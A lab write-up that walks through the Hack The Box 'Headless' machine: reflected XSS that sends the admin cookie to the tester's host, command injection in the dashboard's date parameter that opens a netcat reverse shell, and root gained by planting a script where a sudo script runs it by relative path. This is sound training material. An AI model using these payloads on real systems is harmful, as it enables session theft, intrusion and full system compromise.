---
categories:
- Hackthebox
image:
  path: headless.png
layout: post
media_subpath: /assets/images/headless
tags:
- hackthebox
- writeup
- linux
- command-injection
- cookie-hijacking
- xss
- session-hijacking
- sudo-misconfiguration
- path-hijacking
- easy
title: HTB - Headless Walkthrough
---

## Introduction

Headless is an easy-difficulty Linux machine that demonstrates several important web application attack techniques including session cookie manipulation, XSS-based session hijacking, command injection, and privilege escalation via PATH hijacking. The attack path involves stealing an administrator's session cookie through a reflected XSS vulnerability, using administrative access to exploit a command injection in a reporting feature, and finally abusing a sudo script that executes a relative path binary.

## Reconnaissance
### Port Scanning

Initial `nmap` scan reveals two open ports:

```
# Nmap 7.95 scan initiated Thu Jun 26 21:59:53 2025 as: /usr/lib/nmap/nmap --privileged -p22,5000 -sC -sV -oA nmap/headless 10.10.11.8
Nmap scan report for 10.10.11.8
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Under Construction
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 26 22:00:11 2025 -- 1 IP address (1 host up) scanned in 18.16 seconds
```

**Key Findings:**

- **Port 22/tcp:** OpenSSH 9.2p1 (Debian)
- **Port 5000/tcp:** Werkzeug (Python Flask) web server
- **OS:** Debian Linux

## Web Enumeration

### Initial Website

Visiting port 5000 reveals a countdown page with a "For questions" button:


![i](Pasted image 20250627112453.png)

The button redirects to `/support` which contains a contact form:

![i](Pasted image 20250627112558.png)
### Testing for XSS

Testing the message field with HTML tags reveals a warning about hacking attempts:

![i](Pasted image 20250627112912.png)

**Important Observations:**

1. The server sets a cookie
2. `HttpOnly` flag is `false` (cookies can be accessed via JavaScript)
3. The response reflects our User-Agent

### Cookie Analysis

The cookie appears to be base64 encoded:

```
 echo "InVzZXIi" | base64 -d                                                                                                
"user"  
 echo "uAlmXlTvm8vyihjNaPDWnvB_Zfs" | base64 -d
        f^Thbase64: invalid input
```

The cookie format is `is_user=<base64_data>`. The second part appears to be a signature.

![i](Pasted image 20250627113317.png)

### XSS to Session Hijacking

**Technical Concept: XSS Session Hijacking**

When a web application sets cookies without the `HttpOnly` flag, JavaScript can access them via `document.cookie`. An attacker can inject JavaScript that sends the victim's cookie to their server.

Testing a simple XSS payload:

![i](Pasted image 20250627113521.png)

The payload executes - XSS confirmed!

### Stealing the Admin Cookie

We inject a payload in the message field that will:

1. Redirect the admin (when they view the message) to our server
2. Include their cookie in the request

**Payload:**

```
<script>document.location='http://10.10.14.11:8000/?'+document.cookie</script>
```

**In Burp:**

![i](Pasted image 20250627113831.png)

**Listener Output:**

```
nc -nlvkp 8000                                                                     
listening on [any] 8000 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.8] 43828
GET /?aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1
Host: 10.10.14.11:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5000/
Origin: http://localhost:5000
Connection: keep-alive
```

### Understanding the Cookie

Decoding the admin cookie:

```
echo "ImFkbWluIg" | base64 -d
"admin"
```

The full cookie value:

```
echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0         
```

The period separates:

- Base64 encoded data: `"admin"`
- Signature: `dmzDkZNEm6CK0oyL1fbM-SnXpH0`

### Accessing as Admin

Replace our user cookie with the admin cookie:

![i](Pasted image 20250627114538.png)

**Now authenticated as admin!** Access to `/dashboard` is granted.
## Command Injection

### Dashboard Functionality

The dashboard has a "Generate Report" button:

![i](Pasted image 20250627115121.png)

Clicking it sends a request to `/dashboard` with a `date` parameter.

### Testing for Command Injection

Testing the date parameter with command injection:

![img](Pasted image 20250627114911.png)

**Result:** Command injection confirmed! The `date` parameter is passed directly to a shell command without sanitization.

### Technical Concept: Command Injection

Command injection occurs when user input is concatenated into a system command. Our payload `; id` works because:

- `;` is a command separator in shell
- The application likely runs `date -d "$date"` or similar
- Our input breaks out of the intended command

### Reverse Shell

Start listener:
```
rlwrap nc -nlvp 9001
```

Inject reverse shell payload:

```
date=2023-09-15; busybox nc 10.10.14.11 9001 -e /bin/bash                                                                    
```

![img](Pasted image 20250627115538.png)

**Shell Obtained:**

```
rlwrap nc -nlvp 9001                                                                                
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.8] 49608
id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
```

### Shell Stabilization

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

**User flag:** `/home/dvir/user.txt`

## Privilege Escalation

### Sudo Rights Check

```
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~/app$ 
```
### Analyzing the syscheck Script

```
dvir@headless:~/app$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
dvir@headless:~/app$ 

```

### The Vulnerability: Relative PATH Execution

**Technical Concept: PATH Hijacking**

The script attempts to execute `./initdb.sh` - note the `./` meaning "current directory". This is a **relative path**, not an absolute path (like `/usr/bin/initdb.sh`).

When a script runs with `sudo` (root privileges), and uses a relative path:

1. It looks for the executable in the **current working directory**
2. If we can control a directory where the script runs from, we can place our own malicious script
3. The script will execute OUR code with root privileges!

### Crafting the Malicious Script

Create a reverse shell script in a writable directory:

```
dvir@headless:~/app$ cd /tmp
dvir@headless:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > initdb.sh
dvir@headless:/tmp$ chmod +x initdb.sh
```

### Executing the Script

**Root Shell Obtained:**

```
dvir@headless:/tmp$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.8G
System load average:  0.15, 0.10, 0.10
Database service is not running. Starting it...
id
id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:** `/root/root.txt`

